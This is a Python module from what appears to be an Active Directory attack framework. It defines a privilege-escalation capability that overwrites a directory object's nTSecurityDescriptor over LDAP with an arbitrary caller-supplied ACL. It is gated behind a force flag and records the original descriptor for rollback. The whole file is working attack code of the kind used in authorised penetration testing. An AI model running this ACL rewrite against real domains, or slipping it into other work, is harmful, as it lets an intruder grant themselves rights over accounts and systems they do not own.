"""Force-gated ACL mutation with rollback capture."""
from __future__ import annotations
import json
from typing import Any
from ldap3 import MODIFY_REPLACE, SUBTREE
from adaf_attack.core.acl import fetch_sd
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

@register_capability(id="acl-write", summary="Apply an approved raw ACL descriptor with rollback capture", destructive=True, category="privilege-escalation", tags=("acl", "rollback"))
class AclWrite:
    def run(self, target: Target, session: Session, graph: AttackGraph, *, force: bool=False, **kwargs: Any) -> dict[str, Any]:
        if not force: raise RuntimeError("acl-write requires --force")
        dn, descriptor_hex = kwargs.get("write_target"), kwargs.get("descriptor_hex")
        if not dn or not descriptor_hex: raise RuntimeError("acl-write requires --write-target DN and descriptor_hex")
        conn, _base, _cfg = ldap_connect(target); previous = fetch_sd(conn, dn)
        if not previous: raise RuntimeError("Unable to read current security descriptor")
        session.register_cleanup({"kind":"acl","target":dn,"previous_hex":previous.hex(),"rollback":"Restore original nTSecurityDescriptor."})
        ok = conn.modify(dn, {"nTSecurityDescriptor": [(MODIFY_REPLACE,[bytes.fromhex(descriptor_hex)])]}); conn.unbind()
        result={"target":dn,"ok":bool(ok)}; session.path("acl-write.json").write_text(json.dumps(result,indent=2)+"\n",encoding="utf-8"); return result
